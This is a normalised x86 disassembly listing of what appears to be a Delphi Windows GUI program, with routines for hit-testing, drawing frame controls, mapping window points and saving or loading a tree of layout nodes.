mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44c508
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44c4cc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_417088
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4526a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_452614
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_451c68
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_451eb4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_451c68
call sub_4523e8
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_452730
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403eb8
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404504
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_452778
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_452970
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_452e48
mov eax [ ebp - 0x8 ]
call sub_451e44
xor edx edx
push ebp
push sub_452953
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45295a
mov eax [ ebp - 0x8 ]
call sub_451e48
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45161c
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_452730
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403324
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_45193c
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_452730
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_448ecc
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_449ce4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403128
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_452980
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_4170c4
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_425280
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4529d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_424758
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_424f44
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_424ee4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_424ee4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_424758
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_424ee4
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_424ee4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_452a60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_452980
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_4529d8
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_4529d8
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_452980
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_4529d8
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_4529d8
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_452b3c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424c18
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452c92
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_447b60
mov eax [ ebp - 0x4 ]
call sub_424f1c
xor eax eax
push ebp
push sub_452c75
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_425300
xor eax eax
push ebp
push sub_452c58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_44c508
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452c5f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_425300
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44c4cc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44894c
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_452ca0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_44e308
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4489f4
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_4489b0
mov ecx eax
xor edx edx
xor eax eax
call sub_4170c4
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_44f7d8
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4170ec
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_452e14
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_452e14
pop ecx
mov eax ebx
call sub_403128
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_452e14
pop ecx
sub_452e48
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_452e14
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403128
xor eax eax
mov [ esi + 0x64 ] eax
sub_452ea4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451eb4
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_452ee0
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_452ee0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45314d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c78
mov edx [ ebp - 0x8 ]
pop eax
call sub_404180
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
mov eax [ ebx + 0x14 ]
call sub_451640
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c78
mov edx [ ebp - 0x10 ]
pop eax
call sub_404180
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403128
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453154
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403edc
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_4519f0
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_451b68
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_451ba4
mov eax [ ebx + 0x18 ]
call sub_4519f0
mov [ edx + 0x18 ] eax
push esi
push sub_4536f0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_451f1c
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_451ba4
mov eax [ esi + 0x64 ]
call sub_451b68
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403128
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_4536c8
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403128
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_4516ec
mov edx eax
mov eax edi
call sub_451b90
mov eax edi
call sub_4519f0
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_4536f0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_451f1c
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_4536f0
mov edx [ eax + 0x14 ]
mov eax esi
call sub_451f1c
mov eax [ ebx + 0x14 ]
call sub_403128
mov eax edi
call sub_403128
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_45315c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_44e308
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407e00
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_451b90
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44e274
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_451b90
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_453578
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_4536f0
xor edx edx
mov eax edi
call sub_451f1c
sub_453238
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_451b68
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_40292c
mov edx eax
mov eax ebx
call sub_451b90
sub_453274
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404368
xor eax eax
push ebp
push sub_4532df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404178
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4532e6
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4532ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45339b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4518f8
mov eax [ ebp - 0x8 ]
call sub_453274
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_4532ec
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4533a2
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_4532ec
pop ecx
sub_4533a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4534e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_453490
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44e274
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453497
mov eax [ ebp - 0x10 ]
call sub_403128
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_453274
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44e288
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_453497
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_4532ec
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4534e8
lea eax [ ebp - 0x14 ]
call sub_403eb8
retn
sub_4534f0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_451c40
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451c68
call sub_4534f0
pop ecx
